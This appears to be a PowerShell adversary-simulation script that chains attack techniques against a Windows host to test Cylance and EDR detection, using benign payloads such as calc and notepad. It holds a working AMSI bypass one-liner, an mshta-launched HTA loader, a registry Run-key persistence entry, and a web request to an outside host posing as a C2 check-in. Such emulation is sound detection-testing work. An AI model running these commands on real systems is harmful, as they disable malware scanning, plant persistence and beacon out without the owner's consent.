# Phase 4 Cylance Adversary Simulation - APT Chain Emulation
# Author: imrankhairuddin

function Test-Phase4 {
    param($desc, $command)
    Write-Host "`n>> $desc" -ForegroundColor Magenta
    Write-Host "Command: $command" -ForegroundColor DarkYellow
    Start-Sleep -Seconds 2
    try {
        Invoke-Expression $command
    } catch {
        Write-Warning "Execution failed: $_"
    }
    Start-Sleep -Seconds 5
}

# 1. Initial Access: Dropper (VBA-style simulated macro)
Test-Phase4 "Initial Access (Simulated Macro Payload)" 'Start-Process notepad'

# 2. Execution via LOLBin: mshta (again for C2 loader)
$htaPayload = "$env:TEMP\c2loader.hta"
@"
<html>
<script>
var sh = new ActiveXObject('WScript.Shell');
sh.Run('powershell -Command ""Start-Sleep 10; Start-Process calc""');
</script>
</html>
"@ | Out-File -Encoding ASCII $htaPayload
Test-Phase4 "C2 Loader via mshta.exe" "Start-Process mshta.exe $htaPayload"

# 3. In-Memory Execution + AMSI Bypass (harmless sim)
Test-Phase4 "AMSI Bypass Sim (safe)" '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true); Start-Process calc'

# 4. Persistence: Registry Run Key (safe payload)
Test-Phase4 "Registry Persistence" 'Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "CylanceAPTTest" -Value "calc.exe"'

# 5. Simulated C2 Ping (no real connection)
Test-Phase4 "Simulated C2 Checkin" 'Invoke-WebRequest -Uri "http://merankhairuddin.vercel.app/heartbeat" -UseBasicParsing'

# 6. Process Injection Simulation (no shellcode, just test)
Test-Phase4 "Reflective Injection Emulation" 'Start-Process -WindowStyle Hidden -FilePath notepad; Start-Sleep 2; Write-Host "Simulated process handle opened"'

Write-Host "`n Phase 4 complete. Check Cylance logs, EDR correlation, memory protections." -ForegroundColor Green
